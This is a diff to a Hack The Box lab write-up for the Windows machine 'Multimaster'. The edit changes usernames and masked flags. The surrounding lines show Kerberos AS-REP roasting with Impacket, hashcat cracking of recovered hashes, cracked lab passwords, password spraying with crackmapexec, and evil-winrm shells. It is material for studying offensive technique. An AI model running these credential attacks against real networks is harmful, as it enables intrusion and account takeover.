@@ -9,6 +9,7 @@ avatar: assets/htb/multimaster.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Multimaster
 ---
+
 ## Overview
 
 Hold on to your seats, because this Insane Windows machine is a wild ride. TODO:Finish this writeup, there are more notes and stuff in the notes app if anything is missing...
@@ -22,7 +23,7 @@ I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regular
 At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ nmap -p- -sC -sV -oN multimaster.nmap <YOUR_IP> -Pn
+kac0@kalimaa:~/htb/multimaster$ nmap -p- -sC -sV -oN multimaster.nmap <YOUR_IP> -Pn
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 12:17 EDT
 Nmap scan report for <YOUR_IP>
 Host is up (0.050s latency).
@@ -152,7 +153,7 @@ Content-Length: 1821
 next attempted to enumerate the valid users who have active accounts on this machine through Kerberos.
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ python3 /home/zweilos/impacket/examples/GetNPUsers.py -outputfile multimaster.hash -format hashcat -usersfile /home/zweilos/htb/multimaster/users -no-pass -dc-ip <YOUR_IP> MEGACORP/egre55
+kac0@kalimaa:~/htb/multimaster$ python3 /home/kac0/impacket/examples/GetNPUsers.py -outputfile multimaster.hash -format hashcat -usersfile /home/kac0/htb/multimaster/users -no-pass -dc-ip <YOUR_IP> MEGACORP/egre55
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
 [-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -181,7 +182,7 @@ mine [https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body
 hashcat -m 10800 -a 0 -o hash.cracked hash /usr/share/wordlists/rockyou.txt Possible algorithms: Keccak-384
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$hashcat -m 17900 -a 0 -o hash.cracked hash /usr/share/wordlists/rockyou.txt
+kac0@kalimaa:~/htb/multimaster$hashcat -m 17900 -a 0 -o hash.cracked hash /usr/share/wordlists/rockyou.txt
 snipped...
 
 Session..........: hashcat
@@ -207,7 +208,7 @@ Stopped: Mon Jul 20 19:17:57 2020
 Hashcat was able to crack 3 out of 4 of the hashes
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ cat hash.cracked 
+kac0@kalimaa:~/htb/multimaster$ cat hash.cracked 
 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
 fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
@@ -336,7 +337,7 @@ if __name__ == "__main__":
 ### Finding user creds
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ evil-winrm -u tushikikatomo -i <YOUR_IP> -p finance1
+kac0@kalimaa:~/htb/multimaster$ evil-winrm -u tushikikatomo -i <YOUR_IP> -p finance1
 
 Evil-WinRM shell v2.3
 
@@ -349,7 +350,7 @@ Info: Establishing connection to remote endpoint
 
 ```text
 *Evil-WinRM* PS C:\Users\alcibiades\Desktop> cat user.txt
-6043****4a2f
+6043************************4a2f
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -707,7 +708,7 @@ MASTER7{ "info" : "MegaCorp API" }!application/json€…server=localhost;databa
 ### Moving laterally to user3 - `sbauer`
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ crackmapexec smb -u users -p passwords -d MEGACORP <YOUR_IP>
+kac0@kalimaa:~/htb/multimaster$ crackmapexec smb -u users -p passwords -d MEGACORP <YOUR_IP>
 SMB         <YOUR_IP>    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (signing:True) (SMBv1:True)
 SMB         <YOUR_IP>    445    MULTIMASTER      [-] MEGACORP\shayna:password1 STATUS_LOGON_FAILURE 
 SMB         <YOUR_IP>    445    MULTIMASTER      [-] MEGACORP\shayna:finance1 STATUS_LOGON_FAILURE 
@@ -743,7 +744,7 @@ Set-ADAccountControl -DoesNotRequirePreAuth
 Then we can use Impacket's GETSPNUSers.py
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ evil-winrm -u sbauer -i <YOUR_IP> -p D3veL0pM3nT!
+kac0@kalimaa:~/htb/multimaster$ evil-winrm -u sbauer -i <YOUR_IP> -p D3veL0pM3nT!
 
 Evil-WinRM shell v2.3
 
@@ -796,10 +797,10 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 `*Evil-WinRM* PS C:\inetpub> Set-ADAccountControl -DoesNotRequirePreAuth $True jorden`
 
 ```text
-zweilos@kalimaa:~/.local/bin$ python3 GetNPUsers.py -format hashcat -usersfile /home/zweilos/htb/multimaster/users -debug -dc-ip <YOUR_IP> MEGACORP/sbauer:D3veL0pM3nT!
+kac0@kalimaa:~/.local/bin$ python3 GetNPUsers.py -format hashcat -usersfile /home/kac0/htb/multimaster/users -debug -dc-ip <YOUR_IP> MEGACORP/sbauer:D3veL0pM3nT!
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
-[+] Impacket Library Installation Path: /home/zweilos/.local/lib/python3.8/site-packages/impacket
+[+] Impacket Library Installation Path: /home/kac0/.local/lib/python3.8/site-packages/impacket
 [+] Trying to connect to KDC at <YOUR_IP>
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [+] Trying to connect to KDC at <YOUR_IP>
@@ -865,10 +866,10 @@ $krb5asrep$23$jorden@MEGACORP:1056ca13b19833bd5ae1152f9fe42b5c$112eb867bb4c8c065
 the password cracked very quickly
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ hashcat -m 18200 -a 0 jorden.hash ~/rockyou.txt
+kac0@kalimaa:~/htb/multimaster$ hashcat -m 18200 -a 0 jorden.hash ~/rockyou.txt
 hashcat (v6.0.0) starting...
 Dictionary cache built:
-* Filename..: /home/zweilos/rockyou.txt
+* Filename..: /home/kac0/rockyou.txt
 * Passwords.: 14344391
 * Bytes.....: 139921506
 * Keyspace..: 14344384
@@ -882,7 +883,7 @@ Hash.Name........: Kerberos 5, etype 23, AS-REP
 Hash.Target......: $krb5asrep$23$jorden@MEGACORP:1056ca13b19833bd5ae11...6d38f5
 Time.Started.....: Fri Jul 24 20:36:37 2020 (6 secs)
 Time.Estimated...: Fri Jul 24 20:36:43 2020 (0 secs)
-Guess.Base.......: File (/home/zweilos/rockyou.txt)
+Guess.Base.......: File (/home/kac0/rockyou.txt)
 Guess.Queue......: 1/1 (100.00%)
 Speed.#1.........:   740.8 kH/s (13.81ms) @ Accel:64 Loops:1 Thr:64 Vec:8
 Recovered........: 1/1 (100.00%) Digests
@@ -1041,5 +1042,5 @@ Mode                LastWriteTime         Length Name
 -ar---        7/23/2020  10:08 PM             34 root.txt
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-fe23****b271
+fe23************************b271
 ```
